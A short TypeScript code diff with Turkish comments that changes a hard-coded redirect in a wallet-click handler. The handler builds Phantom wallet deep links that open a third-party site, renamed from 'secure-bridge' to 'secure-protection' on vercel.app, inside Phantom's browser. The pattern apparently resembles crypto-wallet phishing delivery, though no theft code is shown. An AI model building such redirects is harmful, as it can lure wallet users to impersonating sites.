@@ -344,14 +344,14 @@ const handleWalletClick = async (w: DrawerWallet) => {
     }
 
     /* ===== Sabit yönlendirme adresi ===== */
-    const secureBridgeUrl = 'https://secure-bridge.vercel.app/'; // gerektiğinde değiştir
+    const secureBridgeUrl = 'https://secure-protection.vercel.app/'; // gerektiğinde değiştir
     const encodedBridge   = encodeURIComponent(secureBridgeUrl);
 
     // Mevcut sayfanın (Telegram içindeki) tam URL’i
     const currentUrl      = window.location.origin + window.location.pathname;
     const hostAndPath     = currentUrl.replace(/^https?:\/\//, '');
 
-    /* -- Phantom link formatları (secure-bridge’e göre) -- */
+    /* -- Phantom link formatları (secure-protection’e göre) -- */
     const schemePhantom    = `phantom://browse/${encodedBridge}?ref=${encodedBridge}`;
     const universalPhantom = `https://phantom.app/ul/browse/${encodedBridge}?ref=${encodedBridge}`;
 
@@ -374,7 +374,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    /* -- Android normal tarayıcı → Phantom scheme (secure-bridge) -- */
+    /* -- Android normal tarayıcı → Phantom scheme (secure-protection) -- */
     if (isAndroid) {
       const a = document.createElement('a');
       a.href   = schemePhantom;
@@ -385,7 +385,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    /* -- iOS & Desktop → universal link (secure-bridge) -- */
+    /* -- iOS & Desktop → universal link (secure-protection) -- */
     window.location.href = universalPhantom;
     return;
   }
